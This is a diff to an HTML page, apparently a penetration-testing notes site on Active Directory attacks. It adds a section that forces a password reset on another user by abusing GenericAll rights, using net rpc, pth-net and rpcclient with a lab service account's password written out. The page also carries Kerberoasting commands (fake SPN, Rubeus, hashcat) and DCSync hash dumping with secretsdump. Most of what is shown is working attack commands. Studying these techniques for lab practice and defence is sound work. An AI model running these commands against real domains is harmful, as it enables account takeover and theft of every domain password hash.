@@ -29069,143 +29069,171 @@ $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\dam
 </span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
 </span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5"></a><span class="nb">Add-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s1">&#39;Domain Admins&#39;</span> <span class="n">-Members</span> <span class="s1">&#39;AB920&#39;</span> <span class="n">-Credential</span> <span class="nv">$Cred</span>
 </span></code></pre></div></td></tr></table></div>
-<h4 id="2-kerberoasting-attack">2. Kerberoasting attack</h4>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-15-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-15-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-15-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-15-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-15-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-15-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-15-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-15-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-15-10">10</a></span>
-<span class="normal"><a href="#__codelineno-15-11">11</a></span>
-<span class="normal"><a href="#__codelineno-15-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="c"># Creating a SecureString Object using damundsen</span>
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;Pwn3d_by_ACLs!&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3"></a><span class="nv">$Cred2</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;INLANEFREIGHT\damundsen&#39;</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span> 
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4"></a>
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5"></a><span class="c"># Creating a Fake SPN</span>
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6"></a><span class="nb">Set-DomainObject</span> <span class="n">-Credential</span> <span class="nv">$Cred2</span> <span class="n">-Identity</span> <span class="n">adunn</span> <span class="n">-SET</span> <span class="p">@{</span><span class="n">serviceprincipalname</span><span class="p">=</span><span class="s1">&#39;notahacker/LEGIT&#39;</span><span class="p">}</span> <span class="n">-Verbose</span>
-</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7"></a>
-</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8"></a><span class="c">#  Kerberoasting with Rubeus</span>
-</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">adunn</span> <span class="p">/</span><span class="n">nowrap</span>
-</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10"></a>
-</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11"></a><span class="c"># Crack it</span>
-</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">13100</span> <span class="nv">$filename</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
+<h4 id="2-force-change-of-a-password">2. Force change of a password</h4>
+<p>We have the user:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
+<span class="normal"><a href="#__codelineno-15-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>svc_helpdesk
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a>U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
 </span></code></pre></div></td></tr></table></div>
-<p>Clean up:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span>
+<p>with GenericAll on the user Christopher.Lewis. </p>
+<p>![[nagoya2.png]]</p>
+<p>Forcing a change of password:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span>
 <span class="normal"><a href="#__codelineno-16-2">2</a></span>
 <span class="normal"><a href="#__codelineno-16-3">3</a></span>
 <span class="normal"><a href="#__codelineno-16-4">4</a></span>
-<span class="normal"><a href="#__codelineno-16-5">5</a></span>
-<span class="normal"><a href="#__codelineno-16-6">6</a></span>
-<span class="normal"><a href="#__codelineno-16-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="c"># 1. Removing the Fake SPN from adunn&#39;s Account</span>
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2"></a><span class="nb">Set-DomainObject</span> <span class="n">-Credential</span> <span class="nv">$Cred2</span> <span class="n">-Identity</span> <span class="n">adunn</span> <span class="n">-Clear</span> <span class="n">serviceprincipalname</span> <span class="n">-Verbose</span>
+<span class="normal"><a href="#__codelineno-16-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a># Alternative 1: password
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2"></a>net rpc password &quot;christopher.lewis&quot; &quot;Lalalala1234.&quot; -U &quot;NAGOYA-IND&quot;/&quot;svc_helpdesk&quot;%&quot;U299iYRmikYTHDbPbxPoYYfa2j4x4cdg&quot; -S &quot;nagoya-industries.com&quot;
 </span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3"></a>
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4"></a><span class="c"># 2. Remove the damundsen user from the Help Desk Level 1 group</span>
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5"></a><span class="nb">Remove-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Help Desk Level 1&quot;</span> <span class="n">-Members</span> <span class="s1">&#39;damundsen&#39;</span> <span class="n">-Credential</span> <span class="nv">$Cred2</span> <span class="n">-Verbose</span>
-</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6"></a><span class="c"># Confirming damundsen was Removed from the Group</span>
-</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7"></a><span class="nb">Get-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Help Desk Level 1&quot;</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">MemberName</span> <span class="p">|?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">MemberName</span> <span class="o">-eq</span> <span class="s1">&#39;damundsen&#39;</span><span class="p">}</span> <span class="n">-Verbose</span>
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4"></a># Alternative 2: LM hash
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5"></a>pth-net rpc password &#39;Christopher.Lewis&#39; &#39;Lalala1234.&#39; -U &#39;NAGOYA-IND&#39;/svc_helpdesk%&#39;LMhash&#39;:&#39;NThash&#39; -S &#39;nagoya-industries.com&#39;
+</span></code></pre></div></td></tr></table></div>
+<p>Another method for forcing the change of password:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span>
+<span class="normal"><a href="#__codelineno-17-2">2</a></span>
+<span class="normal"><a href="#__codelineno-17-3">3</a></span>
+<span class="normal"><a href="#__codelineno-17-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a>rpcclient -U nagoya-industries/svc_helpdesk 192.168.185.21
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2"></a>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3"></a># And then:
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4"></a>setuserinfo christopher.lewis 23 &#39;Password123&#39;
+</span></code></pre></div></td></tr></table></div>
+<h4 id="3-kerberoasting-attack">3. Kerberoasting attack</h4>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-18-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-18-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-18-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-18-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-18-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-18-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-18-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-18-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-18-10">10</a></span>
+<span class="normal"><a href="#__codelineno-18-11">11</a></span>
+<span class="normal"><a href="#__codelineno-18-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a><span class="c"># Creating a SecureString Object using damundsen</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2"></a><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;Pwn3d_by_ACLs!&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3"></a><span class="nv">$Cred2</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;INLANEFREIGHT\damundsen&#39;</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span> 
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4"></a>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5"></a><span class="c"># Creating a Fake SPN</span>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6"></a><span class="nb">Set-DomainObject</span> <span class="n">-Credential</span> <span class="nv">$Cred2</span> <span class="n">-Identity</span> <span class="n">adunn</span> <span class="n">-SET</span> <span class="p">@{</span><span class="n">serviceprincipalname</span><span class="p">=</span><span class="s1">&#39;notahacker/LEGIT&#39;</span><span class="p">}</span> <span class="n">-Verbose</span>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7"></a>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8"></a><span class="c">#  Kerberoasting with Rubeus</span>
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">adunn</span> <span class="p">/</span><span class="n">nowrap</span>
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10"></a>
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11"></a><span class="c"># Crack it</span>
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12"></a><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">13100</span> <span class="nv">$filename</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
+</span></code></pre></div></td></tr></table></div>
+<p>Clean up:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1">1</a></span>
+<span class="normal"><a href="#__codelineno-19-2">2</a></span>
+<span class="normal"><a href="#__codelineno-19-3">3</a></span>
+<span class="normal"><a href="#__codelineno-19-4">4</a></span>
+<span class="normal"><a href="#__codelineno-19-5">5</a></span>
+<span class="normal"><a href="#__codelineno-19-6">6</a></span>
+<span class="normal"><a href="#__codelineno-19-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a><span class="c"># 1. Removing the Fake SPN from adunn&#39;s Account</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a><span class="nb">Set-DomainObject</span> <span class="n">-Credential</span> <span class="nv">$Cred2</span> <span class="n">-Identity</span> <span class="n">adunn</span> <span class="n">-Clear</span> <span class="n">serviceprincipalname</span> <span class="n">-Verbose</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4"></a><span class="c"># 2. Remove the damundsen user from the Help Desk Level 1 group</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5"></a><span class="nb">Remove-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Help Desk Level 1&quot;</span> <span class="n">-Members</span> <span class="s1">&#39;damundsen&#39;</span> <span class="n">-Credential</span> <span class="nv">$Cred2</span> <span class="n">-Verbose</span>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6"></a><span class="c"># Confirming damundsen was Removed from the Group</span>
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7"></a><span class="nb">Get-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s2">&quot;Help Desk Level 1&quot;</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">MemberName</span> <span class="p">|?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">MemberName</span> <span class="o">-eq</span> <span class="s1">&#39;damundsen&#39;</span><span class="p">}</span> <span class="n">-Verbose</span>
 </span></code></pre></div></td></tr></table></div>
 <h2 id="dcsync">DCSync</h2>
 <p>DCSync is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.</p>
 <p>The crux of the attack is requesting a Domain Controller to replicate passwords via the DS-Replication-Get-Changes-All extended right. This is an extended access control right within AD, which allows for the replication of secret data.</p>
 <p>To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.</p>
 <p><strong>1.</strong> Use Get-DomainUser to View the users's Group Membership:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-17-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="nv">$userSamAccountName</span>  <span class="p">|</span><span class="nb">select </span><span class="n">samaccountname</span><span class="p">,</span><span class="n">objectsid</span><span class="p">,</span><span class="n">memberof</span><span class="p">,</span><span class="n">useraccountcontrol</span> <span class="p">|</span><span class="nb">fl</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="nv">$userSamAccountName</span>  <span class="p">|</span><span class="nb">select </span><span class="n">samaccountname</span><span class="p">,</span><span class="n">objectsid</span><span class="p">,</span><span class="n">memberof</span><span class="p">,</span><span class="n">useraccountcontrol</span> <span class="p">|</span><span class="nb">fl</span>
 </span></code></pre></div></td></tr></table></div>
 <p><strong>2.</strong> Check if the user has replication rights:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-18-1">1</a></span>
-<span class="normal"><a href="#__codelineno-18-2">2</a></span>
-<span class="normal"><a href="#__codelineno-18-3">3</a></span>
-<span class="normal"><a href="#__codelineno-18-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1"></a><span class="c"># we obtained the sid from previous command</span>
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2"></a><span class="nv">$sid</span><span class="p">=</span> <span class="s2">&quot;S-1-5-21-3842939050-3880317879-2865463114-1164&quot;</span>
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3"></a>
-</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4"></a><span class="nb">Get-ObjectAcl</span> <span class="s2">&quot;DC=inlanefreight,DC=local&quot;</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ObjectAceType</span> <span class="o">-match</span> <span class="s1">&#39;Replication-Get&#39;</span><span class="p">)}</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-match</span> <span class="nv">$sid</span><span class="p">}</span> <span class="p">|</span><span class="nb">select </span><span class="n">AceQualifier</span><span class="p">,</span> <span class="n">ObjectDN</span><span class="p">,</span> <span class="n">ActiveDirectoryRights</span><span class="p">,</span><span class="n">SecurityIdentifier</span><span class="p">,</span><span class="n">ObjectAceType</span> <span class="p">|</span> <span class="nb">fl</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span>
+<span class="normal"><a href="#__codelineno-21-2">2</a></span>
+<span class="normal"><a href="#__codelineno-21-3">3</a></span>
+<span class="normal"><a href="#__codelineno-21-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="c"># we obtained the sid from previous command</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2"></a><span class="nv">$sid</span><span class="p">=</span> <span class="s2">&quot;S-1-5-21-3842939050-3880317879-2865463114-1164&quot;</span>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3"></a>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4"></a><span class="nb">Get-ObjectAcl</span> <span class="s2">&quot;DC=inlanefreight,DC=local&quot;</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ObjectAceType</span> <span class="o">-match</span> <span class="s1">&#39;Replication-Get&#39;</span><span class="p">)}</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">SecurityIdentifier</span> <span class="o">-match</span> <span class="nv">$sid</span><span class="p">}</span> <span class="p">|</span><span class="nb">select </span><span class="n">AceQualifier</span><span class="p">,</span> <span class="n">ObjectDN</span><span class="p">,</span> <span class="n">ActiveDirectoryRights</span><span class="p">,</span><span class="n">SecurityIdentifier</span><span class="p">,</span><span class="n">ObjectAceType</span> <span class="p">|</span> <span class="nb">fl</span>
 </span></code></pre></div></td></tr></table></div>
 <p>DCSync replication can be performed using tools such as Mimikatz, Invoke-DCSync, and Impacket’s secretsdump.py.</p>
 <h3 id="linux-impackets-secretsdumppy">Linux:  Impacket’s secretsdump.py</h3>
-<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-19-1"> 1</a></span>
-<span class="normal"><a href="#__codelineno-19-2"> 2</a></span>
-<span class="normal"><a href="#__codelineno-19-3"> 3</a></span>
-<span class="normal"><a href="#__codelineno-19-4"> 4</a></span>
-<span class="normal"><a href="#__codelineno-19-5"> 5</a></span>
-<span class="normal"><a href="#__codelineno-19-6"> 6</a></span>
-<span class="normal"><a href="#__codelineno-19-7"> 7</a></span>
-<span class="normal"><a href="#__codelineno-19-8"> 8</a></span>
-<span class="normal"><a href="#__codelineno-19-9"> 9</a></span>
-<span class="normal"><a href="#__codelineno-19-10">10</a></span>
-<span class="normal"><a href="#__codelineno-19-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a>secretsdump.py<span class="w"> </span>-outputfile<span class="w"> </span><span class="nv">$filename</span><span class="w"> </span>-just-dc<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$userSamAccountName</span>@<span class="nv">$ipDomainController</span>
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a><span class="c1"># As an example:</span>
-</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3"></a><span class="c1"># secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 </span>
-</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4"></a><span class="c1"># -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.</span>
-</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5"></a><span class="c1"># -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.</span>
-</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6"></a><span class="c1"># just-dc-user &lt;USERNAME&gt; to only extract data for a specific user</span>
-</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7"></a><span class="c1"># -pwd-last-set to see when each account&#39;s password was last changed</span>
-</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8"></a><span class="c1"># -history if we want to dump password history</span>
-</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9"></a><span class="c1"># -user-status flag to check and see if a user is disabled. </span>
-</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10"></a>
-</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11"></a><span class="c1"># This will generate 3 files with dumped secrets</span>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-22-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-22-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-22-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-22-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-22-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-22-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-22-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-22-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-22-10">10</a></span>
+<span class="normal"><a href="#__codelineno-22-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a>secretsdump.py<span class="w"> </span>-outputfile<span class="w"> </span><span class="nv">$filename</span><span class="w"> </span>-just-dc<span class="w"> </span><span class="nv">$domain</span>/<span class="nv">$userSamAccountName</span>@<span class="nv">$ipDomainController</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2"></a><span class="c1"># As an example:</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3"></a><span class="c1"># secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 </span>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4"></a><span class="c1"># -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.</span>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5"></a><span class="c1"># -just-dc flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.</span>
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6"></a><span class="c1"># just-dc-user &lt;USERNAME&gt; to only extract data for a specific user</span>
+</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7"></a><span class="c1"># -pwd-last-set to see when each account&#39;s password was last changed</span>
+</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8"></a><span class="c1"># -history if we want to dump password history</span>
+</span><span id="__span-22-9"><a id="__codelineno-22-9" name="__codelineno-22-9"></a><span class="c1"># -user-status flag to check and see if a user is disabled. </span>
+</span><span id="__span-22-10"><a id="__codelineno-22-10" name="__codelineno-22-10"></a>
+</span><span id="__span-22-11"><a id="__codelineno-22-11" name="__codelineno-22-11"></a><span class="c1"># This will generate 3 files with dumped secrets</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Another example:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span>
-<span class="normal"><a href="#__codelineno-20-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a># This will use the preinstalled impacket version of our kali
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2"></a>secretsdump.py &#39;INLANEFREIGHT.LOCAL/$username:$password@$ipDC&#39; -outfile  domainuser.txt
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span>
+<span class="normal"><a href="#__codelineno-23-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a># This will use the preinstalled impacket version of our kali
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2"></a>secretsdump.py &#39;INLANEFREIGHT.LOCAL/$username:$password@$ipDC&#39; -outfile  domainuser.txt
 </span></code></pre></div></td></tr></table></div>
 <h3 id="reversible-encryption-password-storage-set">Reversible Encryption Password Storage Set</h3>
 <p><img alt="" src="../img/reversible.png" /></p>
 <p>When this option is set on a user account, the passwords are stored using RC4 encryption, the key needed to decrypt them is stored in the registry (the <a href="https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview">Syskey</a>) and can be extracted by a Domain Admin or equivalent.</p>
 <p>Enumerate accounts with reversible Encryption Password Storage Set with Active Directive cmdlet:</p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="s1">&#39;userAccountControl -band 128&#39;</span> <span class="n">-Properties</span> <span class="n">userAccountControl</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="s1">&#39;userAccountControl -band 128&#39;</span> <span class="n">-Properties</span> <span class="n">userAccountControl</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Enumerate accounts with reversible Encryption Password Storage Set with PowerView:</p>
